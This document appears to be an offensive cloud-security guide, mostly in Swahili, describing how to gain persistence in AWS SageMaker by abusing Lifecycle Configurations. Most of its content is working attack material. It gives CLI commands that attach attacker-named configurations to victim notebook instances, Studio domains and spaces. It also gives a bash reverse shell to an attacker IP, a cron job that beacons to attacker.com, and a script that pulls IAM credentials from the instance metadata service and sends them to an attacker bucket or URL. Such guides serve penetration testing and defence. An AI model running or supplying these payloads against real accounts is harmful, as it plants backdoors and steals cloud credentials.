# AWS - SageMaker Lifecycle Configuration Persistence

## Overview of Persistence Techniques

Sehemu hii inaelezea mbinu za kupata kudumu katika SageMaker kwa kutumia Lifecycle Configurations (LCCs), ikiwa ni pamoja na reverse shells, cron jobs, wizi wa akreditivu kupitia IMDS, na SSH backdoors. Skripti hizi zinafanya kazi na jukumu la IAM la mfano na zinaweza kudumu hata baada ya kuanzishwa upya. Mbinu nyingi zinahitaji ufikiaji wa mtandao wa nje, lakini matumizi ya huduma kwenye AWS control plane bado yanaweza kuruhusu mafanikio ikiwa mazingira yako katika hali ya 'VPC-only'.
#### Note: SageMaker notebook instances ni kimsingi EC2 instances zinazodhibitiwa ambazo zimewekwa maalum kwa ajili ya kazi za kujifunza mashine.

## Required Permissions
* Notebook Instances:
```
sagemaker:CreateNotebookInstanceLifecycleConfig
sagemaker:UpdateNotebookInstanceLifecycleConfig
sagemaker:CreateNotebookInstance
sagemaker:UpdateNotebookInstance
```
* Maombi ya Studio:
```
sagemaker:CreateStudioLifecycleConfig
sagemaker:UpdateStudioLifecycleConfig
sagemaker:UpdateUserProfile
sagemaker:UpdateSpace
sagemaker:UpdateDomain
```
## Weka Mzunguko wa Maisha kwenye Mifano ya Notebook

### Mfano wa Amri za AWS CLI:
```bash
# Create Lifecycle Configuration*

aws sagemaker create-notebook-instance-lifecycle-config \
--notebook-instance-lifecycle-config-name attacker-lcc \
--on-start Content=$(base64 -w0 reverse_shell.sh)


# Attach Lifecycle Configuration to Notebook Instance*

aws sagemaker update-notebook-instance \
--notebook-instance-name victim-instance \
--lifecycle-config-name attacker-lcc
```
## Weka Mipangilio ya Mzunguko kwenye SageMaker Studio

Mipangilio ya Mzunguko inaweza kuunganishwa katika viwango mbalimbali na kwa aina tofauti za programu ndani ya SageMaker Studio.

### Kiwango cha Kikoa cha Studio (Watumiaji Wote)
```bash
# Create Studio Lifecycle Configuration*

aws sagemaker create-studio-lifecycle-config \
--studio-lifecycle-config-name attacker-studio-lcc \
--studio-lifecycle-config-app-type JupyterServer \
--studio-lifecycle-config-content $(base64 -w0 reverse_shell.sh)


# Apply LCC to entire Studio Domain*

aws sagemaker update-domain --domain-id <DOMAIN_ID> --default-user-settings '{
"JupyterServerAppSettings": {
"DefaultResourceSpec": {"LifecycleConfigArn": "<LCC_ARN>"}
}
}'
```
### Kiwango cha Studio Space (Nafasi Binafsi au Zilizoshirikiwa)
```bash
# Update SageMaker Studio Space to attach LCC*

aws sagemaker update-space --domain-id <DOMAIN_ID> --space-name <SPACE_NAME> --space-settings '{
"JupyterServerAppSettings": {
"DefaultResourceSpec": {"LifecycleConfigArn": "<LCC_ARN>"}
}
}'
```
## Aina za Mipangilio ya Mzunguko wa Maombi ya Studio

Mipangilio ya mzunguko inaweza kutumika kwa aina tofauti za maombi ya SageMaker Studio:
* JupyterServer: Inatekeleza skripti wakati wa kuanzishwa kwa seva ya Jupyter, bora kwa mitambo ya kudumu kama vile reverse shells na cron jobs.
* KernelGateway: Inatekeleza wakati wa uzinduzi wa programu ya kernel gateway, muhimu kwa usanidi wa awali au ufikiaji wa kudumu.
* CodeEditor: Inatumika kwa Mhariri wa Kode (Code-OSS), ikiruhusu skripti zinazotekelezwa wakati wa kuanza kwa vikao vya uhariri wa kode.

### Amri ya Mfano kwa Kila Aina:

### JupyterServer
```bash
aws sagemaker create-studio-lifecycle-config \
--studio-lifecycle-config-name attacker-jupyter-lcc \
--studio-lifecycle-config-app-type JupyterServer \
--studio-lifecycle-config-content $(base64 -w0 reverse_shell.sh)
```
### KernelGateway
```bash
aws sagemaker create-studio-lifecycle-config \
--studio-lifecycle-config-name attacker-kernelgateway-lcc \
--studio-lifecycle-config-app-type KernelGateway \
--studio-lifecycle-config-content $(base64 -w0 kernel_persist.sh)
```
### CodeEditor
```bash
aws sagemaker create-studio-lifecycle-config \
--studio-lifecycle-config-name attacker-codeeditor-lcc \
--studio-lifecycle-config-app-type CodeEditor \
--studio-lifecycle-config-content $(base64 -w0 editor_persist.sh)
```
### Taarifa Muhimu:
* Kuunganisha LCCs kwenye kiwango cha domain au nafasi kunaathiri watumiaji au programu zote ndani ya upeo.
* Inahitaji ruhusa za juu (sagemaker:UpdateDomain, sagemaker:UpdateSpace) ambazo kwa kawaida ni rahisi zaidi kwenye kiwango cha nafasi kuliko kiwango cha domain.
* Udhibiti wa kiwango cha mtandao (kwa mfano, uchujaji mkali wa kutoka) unaweza kuzuia shells za nyuma zinazofanikiwa au uhamishaji wa data.

## Shell ya Nyuma kupitia Mipangilio ya Mzunguko

Mipangilio ya Mzunguko ya SageMaker (LCCs) inatekeleza skripti maalum wakati mifano ya notebook inaanza. Mshambuliaji mwenye ruhusa anaweza kuanzisha shell ya nyuma inayodumu. 

### Mfano wa Payload:
```
#!/bin/bash
ATTACKER_IP="<ATTACKER_IP>"
ATTACKER_PORT="<ATTACKER_PORT>"
nohup bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1 &
```
## Cron Job Persistence via Lifecycle Configuration

Mshambuliaji anaweza kuingiza kazi za cron kupitia scripts za LCC, kuhakikisha utekelezaji wa mara kwa mara wa scripts au amri za uhalifu, na kuwezesha kudumu kwa siri.

### Payload Example:
```
#!/bin/bash
PAYLOAD_PATH="/home/ec2-user/SageMaker/.local_tasks/persist.py"
CRON_CMD="/usr/bin/python3 $PAYLOAD_PATH"
CRON_JOB="*/30 * * * * $CRON_CMD"

mkdir -p /home/ec2-user/SageMaker/.local_tasks
echo 'import os; os.system("curl -X POST http://attacker.com/beacon")' > $PAYLOAD_PATH
chmod +x $PAYLOAD_PATH

(crontab -u ec2-user -l 2>/dev/null | grep -Fq "$CRON_CMD") || (crontab -u ec2-user -l 2>/dev/null; echo "$CRON_JOB") | crontab -u ec2-user -
```
## Uhamasishaji wa Akida kupitia IMDS (v1 & v2)

Mikakati ya mzunguko inaweza kuuliza Huduma ya Metadata ya Kifaa (IMDS) ili kupata akida za IAM na kuhamasisha hizo kwenye eneo linalodhibitiwa na mshambuliaji.

### Mfano wa Payload:
```bash
#!/bin/bash
ATTACKER_BUCKET="s3://attacker-controlled-bucket"
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
ROLE_NAME=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME > /tmp/creds.json

# Exfiltrate via S3*

aws s3 cp /tmp/creds.json $ATTACKER_BUCKET/$(hostname)-creds.json

# Alternatively, exfiltrate via HTTP POST*

curl -X POST -F "file=@/tmp/creds.json" http://attacker.com/upload
```

